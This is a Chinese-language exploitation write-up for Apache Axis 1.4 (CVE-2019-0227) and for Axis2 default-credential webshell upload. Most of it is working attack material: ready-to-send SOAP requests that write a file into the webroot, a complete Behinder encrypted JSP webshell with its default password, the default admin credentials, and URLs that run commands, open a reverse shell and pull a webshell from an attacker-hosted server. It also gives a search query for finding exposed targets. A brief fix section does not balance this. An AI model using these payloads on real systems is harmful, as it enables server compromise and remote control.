## 1.什么是Axis

```
axis全称Apache Extensible Interaction System 即阿帕奇可扩展交互系统。Axis本质上就是一个SOAP引擎，提供创建服务器端、客户端和网关SOAP操作的基本框架。Axis版本是为Java编写的，不过为C++的版本正在开发中。但Axis并不完全是一个SOAP引擎，它还是一个独立的SOAP服务器和一个嵌入Servlet引擎（例如Tomcat）的服务器。
```

## 2.CVE-2019-0227

[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) Axis 1.4 远程代码执行

### 2.1漏洞原理

```
Axis 1.4 adminservice开启远程访问，此时攻击者可通过 services/AdminService 服务 部署一个webservice , webservice开启一个写文件服务 , 攻击者可以写入任意文件 , getshell
```

### 2.2影响范围

```
Axis <=1.4 
enableRemoteAdmin 设置为True , 默认是false
```

### 2.3环境搭建

```
tomcat +apache Axis 1.4 
解压 axis.zip 放到tomcat目录下 webapp 下即可 , 里面的配置 , 已经配置好了

github地址

```

![image-20220910103745320](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910103745320.png)

然后访问

```
http://192.168.0.78:8080/axis/
```

![image-20220910103805828](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910103805828.png)

环境搭建成功 , 访问 

```
http://192.168.0.78:8080/axis/servlet/AdminServlet
```

生成 server-config.wsdd , 这里靶机环境已经提前配置好 , 不需要访问也行

### 2.4漏洞复现

POC1：开启写文件功能，并指定写入路径 , **注意路径**

```
POST /axis/services/AdminService HTTP/1.1
Host: 192.168.0.78:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 777

<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" >
  <soap:Body>
    <deployment
      xmlns="http://xml.apache.org/axis/wsdd/"
      xmlns:java="http://xml.apache.org/axis/wsdd/providers/java">
        <service name="randomAAA" provider="java:RPC">
<requestFlow>
            <handler type="java:org.apache.axis.handlers.LogHandler" >
                <parameter name="LogHandler.fileName" value="../webapps/ROOT/shell.jsp" />
                <parameter name="LogHandler.writeToConsole" value="false" />
            </handler>
        </requestFlow>
          <parameter name="className" value="java.util.Random" />
          <parameter name="allowedMethods" value="*" />
        </service>
    </deployment>
  </soap:Body>
</soap:Envelope>
```

![image-20220910115547702](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910115547702.png)

把冰蝎马写入文件内容 , 虽然影响是500 , 但是已经写进入了

```
POST /axis/services/RandomService HTTP/1.1
Host: 127.0.0.1:8080
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept-Language: en-US,en;q=0.5
SOAPAction: something
Upgrade-Insecure-Requests: 1
Content-Type: application/xml
Accept-Encoding: gzip, deflate
Content-Length: 1157

<?xml version="1.0" encoding="utf-8"?>
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:api="http://127.0.0.1/Integrics/Enswitch/API"
        xmlns:xsd="http://www.w3.org/2001/XMLSchema"
        xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Body>
        <api:main
        soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
            <api:in0><![CDATA[
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
]]>
            </api:in0>
        </api:main>
  </soapenv:Body>
</soapenv:Envelope>
```

![image-20220910115606129](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910115606129.png)

一次写入不成功可能需要多次写入

使用冰蝎链接

```
http://192.168.0.78:8080/shell.jsp
rebeyond
```

![image-20220910115441502](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910115441502.png)

### 2.5修复建议

```
默认情况下service远程管理没开启，也即配置文件中enableRemoteAdmim为false，也就是只能本地localhost访问，这种情况下可以结合ssrf和xxe进行利用，所以比较鸡肋，但是安全无小事，对于命令执行漏洞还是应该重视。修复的话，关闭admin服务即可，具体方法注释掉web-inf/web.xml 里的AdminServlet，然后重启tomcat
```

### 2.6漏洞总结

```
漏洞分析篇幅不是很长，整体来说这个漏洞其实就是一个文件任意写入，但由于这个组件的一些特性。即通过server-config.wsdd来初始化和配置service，那么就可以写入一个恶意的service，到该文件中，进行调用实现RCE的效果。在复现漏洞中，发现需要/servlet/AdminServlet取消这个路由的注释，实际上在测试中发现，访问该路由会自动生成server-config.wsdd文件，我们需要的是该文件。有server-config.wsdd文件，/servlet/AdminServlet存不存在就显得没那么重要了。至此再一次佩服漏洞挖掘者。
```

补充

```
https://xz.aliyun.com/t/5513
https://www.cxyck.com/article/131848.html
```

## 3.Axis2后台弱口令上传arr包Getshell

### 3.1Axis2介绍

```
Axis2是下一代 Apache Axis。Axis2 虽然由 Axis 1.x 处理程序模型提供支持，但它具有更强的灵活性并可扩展到新的体系结构。Axis2 基于新的体系结构进行了全新编写，而且没有采用 Axis 1.x 的常用代码。支持开发 Axis2 的动力是探寻模块化更强、灵活性更高和更有效的体系结构，这种体系结构可以很容易地插入到其他相关 Web 服务标准和协议（如 WS-Security、WS-ReliableMessaging 等）的实现中。

Apache Axis2 是Axis的后续版本，是新一代的SOAP引擎。
```

### 3.2环境搭建

```
tomcat + Axis2 war包部署
https://dlcdn.apache.org/axis/axis2/java/core/1.6.1/axis2-1.6.1-war.zip   

# 新版本竟然不支持不配置service的方式
如果不确定服务器运行时的axis2版本，可以通过webapps/axis2/WEB-INF/services查看，或者使用http://server:port/axis2/services/Version?wsdl获取版本号

fofa
title="Axis 2 - Home"
```

### 3.3漏洞复现

访问

```
http://192.168.0.78:8080/axis2/
```

![image-20220910123312503](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910123312503.png)

点击 Administration

![image-20220910123340127](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910123340127.png)

```
admin
axis2
```

上传.aar包 , 推荐一个axis2的webshell  

```
https://github.com/Svti/Axis2Shell ( 推荐 config.aar包 ) 
```

![image-20220910124051454](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910124051454.png)

![image-20220910124127190](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910124127190.png)

![image-20220910124118784](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910124118784.png)

查看参数

```
http://ip:8080/axis2/services/config?wsdl
```

![image-20220910132948620](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910132948620.png)

执行系统命令

```
http://ip:8080/services/config/exec?cmd=whoami
```

![image-20220910133003379](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910133003379.png)

查看class的路径 , 方便文件上传

```
http://ip:8080/services/config/getClassPath
```

![image-20220910133125782](https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/imageimage-20220910133125782.png)

反弹shell

```
http://ip:8080/services/config/shell?host=ip&port=5656
```

写入冰蝎马

```
http://ip:8080/services/config/download?url=http://ip:8000/mm.txt&path=C:/apache-tomcat-7.0.57/webapps1/axis2/jkl.jsp
```

冰蝎连接

```
http://ip:8080/axis2/jkl.jsp
rebeyond
```







